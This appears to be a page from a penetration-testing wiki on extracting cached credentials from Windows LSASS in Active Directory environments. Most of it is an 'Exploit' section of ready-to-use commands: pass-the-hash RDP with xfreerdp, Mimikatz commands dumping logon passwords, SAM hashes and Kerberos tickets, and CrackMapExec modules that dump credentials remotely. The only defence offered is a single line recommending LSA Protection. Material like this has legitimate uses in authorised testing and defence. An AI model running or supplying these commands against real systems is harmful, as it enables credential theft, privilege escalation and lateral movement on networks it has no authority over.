---
layout: default
title: Cached Credentials Extraction
parent: Active Directory
nav_order: 4
permalink: /ad/credentials/
---

# Cached Credentials Extraction
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

In modern versions of Windows, password hashes are stored in the Local Security Authority Subsystem Service (LSASS) memory space. An attacker who could access to these hashes could crack them to obtain the cleartext password or reuse them to lateralize his attack or to elevate his privileges.

## Prerequisites

- SYSTEM or local administrator rights on a domain joined computer.

## Exploit

First, connect to the target computer via RDP.

```bash
# On Kali. Use "mstsc.exe" on Windows instead.
xfreerdp /cert-ignore /u:$USERNAME /d:$DOMAIN /p:$PASSWORD /v:$TARGET

# Using Path-the-Hash
xfreerdp /cert-ignore /u:$USERNAME /d:$DOMAIN /pth:$HASH /v:$TARGET
```

Then, use `Mimikatz` to dump credentials.

```bash
# Start Mimikatz in a administrator PowerShell
.\Mimikatz.exe

# Engage SeDebugPrivlege, to interact with a process owned by another account
privilege::debug

# Dump passwords of all logged on users
sekurlsa::logonpasswords

# Dump NTLM hashes from SAM
token::elevate
lsadump::sam

# Dump Kerberos tickets stored in-memory
sekurlsa::tickets
```

It’s also possible to do it remotely with CrackMapExec.

```bash
cme smb $TARGET -u $USERNAME -p $PASSWORD --lsa
cme smb $TARGET -u $USERNAME -p $PASSWORD -M nanodump
cme smb $TARGET -u $USERNAME -p $PASSWORD -M mimikatz
cme smb $TARGET -u $USERNAME -p $PASSWORD -M lsassy
```

## Recommendations

- [ ] Enable additional LSA Protection. The LSA includes the LSASS process. By setting a registry key, Windows prevents reading memory from this process.